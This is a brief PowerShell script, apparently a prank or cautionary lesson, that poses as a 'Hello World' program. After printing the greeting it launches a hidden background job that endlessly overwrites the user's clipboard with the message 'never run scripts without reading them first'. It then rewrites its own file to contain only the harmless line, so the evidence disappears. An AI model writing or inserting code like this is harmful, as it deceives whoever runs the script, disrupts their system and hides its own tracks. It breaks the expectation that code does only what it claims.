write-host 'Hello World'

Start-Job -ScriptBlock {while ($true){set-Clipboard -Value "never run scripts without reading them first"}}

$scriptPath = $MyInvocation.MyCommand.Path

$newContent = "write-host 'Hello World'"

Set-Content -Path $scriptPath -Value $newContent
